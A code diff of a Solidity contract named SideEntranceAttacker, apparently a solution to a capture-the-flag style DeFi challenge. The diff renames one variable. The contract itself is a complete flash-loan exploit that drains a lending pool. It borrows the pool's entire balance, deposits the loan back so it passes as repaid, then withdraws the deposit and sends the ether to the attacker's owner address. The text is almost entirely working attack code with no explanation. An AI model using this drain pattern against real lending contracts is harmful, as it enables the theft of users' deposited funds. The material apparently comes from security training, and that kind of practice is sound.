@@ -15,22 +15,22 @@ interface ISideEntranceLenderPool {
 
 contract SideEntranceAttacker is IFlashLoanEtherReceiver {
     address owner;
-    ISideEntranceLenderPool poolContract;
+    ISideEntranceLenderPool pool;
 
     constructor(address _pool) {
         owner = msg.sender;
-        poolContract = ISideEntranceLenderPool(_pool);
+        pool = ISideEntranceLenderPool(_pool);
     }
 
     function flashLoan() external {
-        poolContract.flashLoan(address(poolContract).balance);
-        poolContract.withdraw();
+        pool.flashLoan(address(pool).balance);
+        pool.withdraw();
 
         payable(owner).transfer(address(this).balance);
     }
 
     function execute() override external payable {
-        poolContract.deposit{value: msg.value}();
+        pool.deposit{value: msg.value}();
     }
 
     receive () external payable {}
